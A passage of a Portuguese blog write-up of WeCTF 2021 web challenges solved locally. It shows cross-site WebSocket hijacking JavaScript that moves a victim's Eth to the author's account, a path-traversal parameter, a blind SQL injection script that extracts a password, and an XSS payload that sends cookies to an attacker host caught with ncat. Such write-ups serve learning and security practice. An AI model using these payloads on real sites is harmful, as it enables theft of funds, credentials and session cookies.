Eth; sell, que vende Eth, e por fim transfer, que transfere Eth de um usuário para o outro. Tendo isso em mãos, basta montar um pequeno webserver em Python com o site malicioso que criará a conexão e fará as transferências para nossa conta! Sendo isso, fiz um site simples com uma tag script com o código abaixo.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>socket</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebSocket</span>(<span style=color:#e6db74>&#34;ws://localhost:4001&#34;</span>,<span style=color:#e6db74>&#34;ethexchange-api&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>transfer</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;type&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;transfer&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;content&#34;</span><span style=color:#f92672>:</span> {
+</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;amount&#34;</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3</span>, <span style=color:#75715e>// quantidade humilde para teste
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#e6db74>&#34;to_token&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;meu_token&#34;</span> <span style=color:#75715e>// aqui entraria o token do meu user
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>onopen</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>event</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Vários para garantir
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>onmessage</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>event</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;http://localhost:8000/?response=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>data</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>O código fará várias tentativas de transfer de Eth para a minha conta e para cada resposta do servidor, enviará a mensagem para o localhost porta 8000 em forma de parâmetro de requisição e ela poderá ser vista na lista de requests do servidor Python aberto com <code>python -m http.server</code>. Com isso, conseguimos a resposta abaixo:</p><p><img src=/blog/writeup-wectf-2021/exploit-parte-1.png alt="Primeira tentativa de exploit"></p><p>Obtemos um JSON dizendo foram feitas três transferências de 0 Eth. Isso nos mostra que a vítima em questão não possui Eth na conta, somente dólares. Não seja por isso: podemos também fazer com que ele compre Eth antes de transferir! Basta adicionar compra de Eth no payload e a flag é nossa!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>/* Mantém a mesma coisa que antes, mas agora tem isso */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>buy</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;type&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;buy&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;content&#34;</span><span style=color:#f92672>:</span> {
+</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;amount&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;7000&#34;</span>,
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>onopen</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>event</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Agora com buy antes 
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>buy</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>buy</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>buy</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>onmessage</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>event</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;http://localhost:8000/?response=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>data</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><img src=/blog/writeup-wectf-2021/payload-parte-2.png alt="Transferência bem sucedida no Terminal"></p><p>Agora as requisições mostram que dinheiro foi transferido para nossa conta, e se olharmos para nosso saldo&mldr;</p><p><img src=/blog/writeup-wectf-2021/conta-com-dinheiro.png alt="Conta com Dinheiro"></p><p>Tendo mais de 5 mil na sua conta, a flag será enviada para você na comunicação WebSocket depois de você enviar um ping.</p><p><img src=/blog/writeup-wectf-2021/coin-flag.png alt="Flag do Desafio"></p><h2 id=cache>Cache<a href=#cache class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Nesse desafio, temos um site simples com duas páginas: <code>index</code> e <code>flag</code>. Na página <code>index</code>, recebemos um texto simples dizendo que não tem nada lá, mas para conferir o <code>flag</code>. Em <code>flag</code>, vemos que não podemos acessar a não ser que sejamos admin. Na pasta <code>uv_worker</code> vemos que existe um arquivo Python do desafio, então é outro desafio no qual temos que enviar links maliciosos para a vítima</p><p><img src=/blog/writeup-wectf-2021/codigo-fonte-cache.png alt="Código Fonte do Desafio"></p><p>Dando uma olhada no código fonte da middleware que faz a autenticação que bloqueia a gente, vemos uma implementação de caching curiosa: se a página a ser acessada tiver sufixo de JS, HTML ou CSS, ela será cacheada e disponível para acesso mais rapidamente que as outras.</p><p>Isso é feito para que arquivos estáticos, os que todo usuário precisa ter acesso, estejam disponíveis rapidamente. Mas esse cache foi implementado de uma forma insegura, que permite um ataque de <em>cache deception</em>: a manipulação do sistema de cache de forma a cachear informações confidenciais, como por exemplo uma página de admin&mldr;</p><p>Para isso, basta gerar um link no site alvo cujo sufixo passe pelo filtro de cache, mas o prefixo contenha a palavra <code>flag</code>, e mandar para que o administrador acesse. Isso fará com que o arquivo seja disponibilizado para todos por causa do cache, mas o roteamento do site vai gerar a página com a informação confidencial. Ela estará disponível por 10s: tempo o suficiente para acessarmos a página e obter a flag!</p><h2 id=include>Include<a href=#include class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Nesse desafio temos uma página, que, quando aberta, reclama que não definimos um arquivo para ser apresentado. O código PHP no começo da página mostra que o arquivo tem que ser passado como parâmetro do GET, e também usando um emoji. O desafio também mostra que a flag está no arquivo <code>flag.txt</code>. Sendo assim, basta acessar a página com o parâmetro a seguir e a flag é nossa!</p><p>/?exploding_head=/flag.txt</p><h2 id=phish>Phish<a href=#phish class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Esse desafio é interessante: a vítima dos desafios, Shou, caiu num site de phishing que não é nosso! Mas o site de phishing em si é vulnerável à SQLi, e sabendo disso, nosso objetivo é extrair a senha dele (a flag) desse site. Para esse caso, o código fonte nos mostra algo interessante: se a query para o banco de dados tiver algum tipo de erro, esse erro será retornado na tela, caso contrário, a query passa e ele redirecionará para a página que mostra que você teve sua senha roubada.</p><p><img src=/blog/writeup-wectf-2021/source_code_phish.png alt="Código Fonte do Desafio"></p><p>O site não possui nenhum tipo de reflexão de dados na tela, então algum tipo de SQLi que retorne a senha na tela é inviável. No entanto, podemos fazer diferente: como somente erros aparecem na tela, podemos fazer bruteforce da senha injetando uma query que insira uma senha no BD <em>se e somente se</em> nosso palpite for uma parte da senha do Shou. Para fazer isso, escrevi o pequeno script abaixo, cujo payload do SQLi e detalhes eu vou descrever melhor abaixo.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> requests <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;127.0.0.1:4008&#34;</span>
+</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> session()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    passwd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;we{&#34;</span>
+</span></span><span style=display:flex><span>    name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;nomedeusuario&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    char <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;+&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#e6db74>&#39;}&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> passwd:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> char <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;?&#39;</span>:
+</span></span><span style=display:flex><span>            char <span style=color:#f92672>=</span> chr(ord(char) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        passwd_iteration <span style=color:#f92672>=</span> passwd <span style=color:#f92672>+</span> char
+</span></span><span style=display:flex><span>        sqli <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;qqrcoisa&#39;,( SELECT password FROM user WHERE username=&#39;shou&#39; AND password GLOB &#39;</span><span style=color:#e6db74>{</span>passwd_iteration<span style=color:#e6db74>}</span><span style=color:#e6db74>*&#39; ));--&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        form_data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;username&#34;</span>: name,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;password&#34;</span>: sqli
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        result <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74>/add&#34;</span>,data<span style=color:#f92672>=</span>form_data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Your password is leaked&#34;</span> <span style=color:#f92672>in</span> result<span style=color:#f92672>.</span>content <span style=color:#f92672>or</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;UNIQUE constraint failed&#34;</span> <span style=color:#f92672>in</span> result<span style=color:#f92672>.</span>content:
+</span></span><span style=display:flex><span>            passwd <span style=color:#f92672>+=</span> char
+</span></span><span style=display:flex><span>            char <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;+&#39;</span>
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&gt; HIT: </span><span style=color:#e6db74>{</span>passwd<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;NOT NULL constraint failed&#34;</span> <span style=color:#f92672>in</span> result<span style=color:#f92672>.</span>content:
+</span></span><span style=display:flex><span>            <span style=color:#75715e># print(f&#34;&gt; NOT HIT: {passwd + char}&#34;)</span>
+</span></span><span style=display:flex><span>            char <span style=color:#f92672>=</span> chr(ord(char) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)
+</span></span></code></pre></div><ul><li>O banco de dados utiliza SQLite</li><li>A ordem do <code>INSERT</code> no código fonte é <code>(password,username)</code>, então a injeção de SQL é no <code>password</code>, para que eu possa injetar propriamente a subquery em questão</li><li>A operação <code>GLOB</code> é usada porque, ao invés do <code>LIKE</code>, ele é case-sensitive.</li><li>O <code>UNIQUE constraint failed</code> passa como válido para a comparação de senha porque o erro vem de estarmos inserindo o mesmo usuário várias vezes, logo não implica que a comparação deu errado, então esse erro é um falso negativo</li></ul><p>Com esse exploit, a senha será construida lentamente através das &ldquo;confirmações&rdquo; do banco de dados do site!</p><p><img src=/blog/writeup-wectf-2021/exploit_phishing.gif alt="Exploit sendo executado"></p><h2 id=csp-1>CSP 1<a href=#csp-1 class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Esse foi o desafio dos quais eu mais lutei contra, por um motivo mais relacionado com o ambiente de teste do que o desafio em si, mas já já falo sobre isso. Ao iniciá-lo, você verá um site no qual você pode escrever num formulário um pequeno website, que pode ser acessado depois por um link gerado na hora. A princípio você pode pensar &ldquo;ah, vou escrever uma tag script, rodar meu JS, pegar a flag e sair correndo&rdquo;. Boa ideia, mas ela não vai funcionar, por um simples motivo: CSP, ou Content Security Policy.</p><p>Content-Security-Policy é um cabeçalho de requisição enviado pelo servidor, que define o que pode e não pode ser executado ao acessar uma página. Quando enviamos o nosso projeto de website, ele nos retorna o site do jeito que fizemos, mas bloqueando conteúdos perigosos por meio dessa medida de segurança.</p><p>Se fizermos um simples site com uma tag img, veremos que a página criada remove o arquivo desejado e deixa somente o domínio, para que imagens possam ser pegas nele. Então se enviamos uma url com <code>https://evil.com/imagem.jpg</code> o CSP terá configurado com <code>https://evil.com</code> somente</p><p>Isso mostra que o que é passado pro atributo src é colocado no CSP pelo servidor. Sendo assim, isso abre uma possibilidade para alterar o que tem no CSP, permitindo que façamos um site com XSS para enviar ao administrador e pegar a flag!</p><p>Lendo mais sobre o CSP, é possível ver que o atributo <code>script-src</code> define se scripts podem ser rodados no site em questão. No site alvo, ele está desabilitado, mas ao injetarmos nosso próprio <code>script-src</code> com o valor <code>unsafe-inline</code>, podemos agora fazer tags script e executar código.</p><p>A partir daqui, bastaria fazer um fetch com os dados do cookie para um domínio ou servidor que controlamos e sucesso, certo? Errado, por um simples motívo: fetch está bloqueado pelo CSP, e como está antes da nossa injeção, não podemos sobrescrevê-lo. Mas não seja por isso: basta, ao injetar o CSP, autorizar um domínio nosso e, por meio de outra imagem, exfiltrar os dados. Isso pode ser feito da seguinte forma:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>setTimeout</span>(<span style=color:#66d9ef>function</span>(){
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>imgNova</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>createElement</span>(<span style=color:#e6db74>&#34;img&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>imgNova</span>.<span style=color:#a6e22e>src</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://meu.pc:8001/?cookie=&#34;</span> <span style=color:#f92672>+</span> document.<span style=color:#a6e22e>cookie</span>;
+</span></span><span style=display:flex><span>},<span style=color:#ae81ff>2000</span>);
+</span></span></code></pre></div><p>Note que a url em questão é meu.pc. Isso se dá porque tem um pequeno problema de fazer esse desafio usando localhost: como tanto a máquina do atacante como a máquina da vítima estão no mesmo domínio de rede, o cookie de autenticação será enviado mesmo se você não exfiltrar ele, porque ele é considerado como Same Origin. Para fazer com que o desafio ficasse mais parecido com o real, eu adicionei no <code>/etc/hosts</code> uma linha que define outro nome para localhost: <code>meu.pc</code>. Dessa forma, eu não tomo um <em>spoiler</em> do desafio!</p><p>E passando esse link para o computador da vítima (no mesmo jeito com a pasta <code>uv_worker</code> que os outros desafios), quando ela acessar, uma requisição será enviada para localhost:8001. Para ver o que é mandado lá, basta &ldquo;ouvir&rdquo; usando netcat (<code>ncat -lk localhost 8001</code>) e o cookie chegará da seguinte forma:</p><p><img src=/blog/writeup-wectf-2021/flag_csp.png alt="Output do netcat depois do exploit"></p><h1 id=considerações-finais>Considerações Finais<a href=#considerações-finais class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Eu parei meu write up aqui por alguns motivos simples:</p><ul><li>Alguns containers não funcionam ainda no ambiente local, e não consegui descobrir o porque ainda</li><li>Minhas férias acabaram, infelizmente</li><li>Estou trabalhando em outros projetos relacionados à segurança (segredo)</li></ul><p>Pretendo atualizar esse post com as próximas soluções que conseguir assim que tiver conseguido atacar o desafio, mas por enquanto fico por aqui. Obrigado por ter lido até aqui!</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Leia outros posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://dandeeccastro.github.io/blog/posts/internet-e-o-novo-parquinho/><span class=button__icon>←</span>
+<span class=button__text>A internet é o novo parquinho</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://dandeeccastro.github.io/blog/assets/main.js></script>
+<script src=https://dandeeccastro.github.io/blog/assets/prism.js></script></div></body></html>
